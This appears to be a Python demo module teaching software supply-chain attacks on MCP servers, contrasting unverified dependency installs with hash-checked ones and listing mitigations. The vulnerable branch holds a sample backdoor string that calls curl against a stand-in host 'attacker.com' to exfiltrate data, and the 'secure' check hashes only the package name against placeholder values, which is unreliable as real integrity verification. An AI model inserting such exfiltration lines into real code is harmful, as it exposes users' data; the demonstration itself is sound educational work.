"""
MCP04 - Software Supply Chain Attacks & Dependency Tampering
Compromised dependency in security assessment toolkit
"""

from agent_client import SecureOpsAgent, AgentContext
from i18n import t
import asyncio
import hashlib


class DependencyManager:
    """Manages MCP server dependencies"""
    
    KNOWN_GOOD_HASHES = {
        "security-scanner": "a1b2c3d4e5f6...",
        "compliance-checker": "f6e5d4c3b2a1...",
    }
    
    @staticmethod
    def install_package(package_name: str, verify: bool = False) -> dict:
        """Install a package dependency"""
        
        if not verify:
            # VULNERABLE: No verification
            return {
                "package": package_name,
                "version": "1.0.0",
                "installed": True,
                "backdoor": "exec(__import__('os').system('curl attacker.com/exfil'))"  # COMPROMISED!
            }
        else:
            # Secure: Verify integrity
            package_hash = hashlib.sha256(package_name.encode()).hexdigest()
            
            if package_hash != DependencyManager.KNOWN_GOOD_HASHES.get(package_name):
                return {
                    "package": package_name,
                    "installed": False,
                    "error": "Hash mismatch - possible tampering"
                }
            
            return {
                "package": package_name,
                "version": "1.0.0",
                "installed": True,
                "verified": True
            }


async def run_vulnerable_scenario():
    """Vulnerable: Install dependencies without verification"""
    print(f"\n{'='*60}")
    print(t("mcp04_vulnerable_title"))
    print(f"{'='*60}\n")
    
    agent = SecureOpsAgent()
    context = AgentContext(
        client_name="RetailChain Inc",
        engagement_type="compliance_audit",
        permissions=["install", "scan"],
        session_id="sess_007"
    )
    agent.set_context(context)
    
    # Install dependency without verification
    print(f"{t('mcp04_installing')}")
    result = DependencyManager.install_package("security-scanner", verify=False)
    
    agent.log(f"Installed: {result['package']} v{result['version']}")
    
    if "backdoor" in result:
        print(f"\n{t('mcp04_compromised')}:")
        print(f"  🚨 Backdoor code: {result['backdoor']}")
        print(f"\n{t('mcp04_impact')}")


async def run_secure_scenario():
    """Secure: Verify dependencies with checksums and signatures"""
    print(f"\n{'='*60}")
    print(t("mcp04_secure_title"))
    print(f"{'='*60}\n")
    
    agent = SecureOpsAgent()
    context = AgentContext(
        client_name="RetailChain Inc",
        engagement_type="compliance_audit",
        permissions=["install", "scan"],
        session_id="sess_008"
    )
    agent.set_context(context)
    
    # Install with verification
    print(f"{t('mcp04_installing')}")
    result = DependencyManager.install_package("security-scanner", verify=True)
    
    if result.get("verified"):
        print(f"  ✅ Package verified: {result['package']}")
        print(f"  ✅ Integrity check passed")
    elif "error" in result:
        agent.log(f"Installation blocked: {result['error']}", "SECURITY")
        print(f"  🛡️ Tampering detected and prevented")
    
    print(f"\n{t('mcp04_mitigations')}:")
    print("  • Verify package signatures (GPG)")
    print("  • Check SHA-256 hashes against known-good values")
    print("  • Use private package repositories")
    print("  • Implement Software Bill of Materials (SBOM)")
    print("  • Regular dependency audits")
    print("  • Pin exact versions, avoid wildcards")


async def run_demo():
    """Run MCP04 demonstration"""
    await run_vulnerable_scenario()
    await asyncio.sleep(2)
    await run_secure_scenario()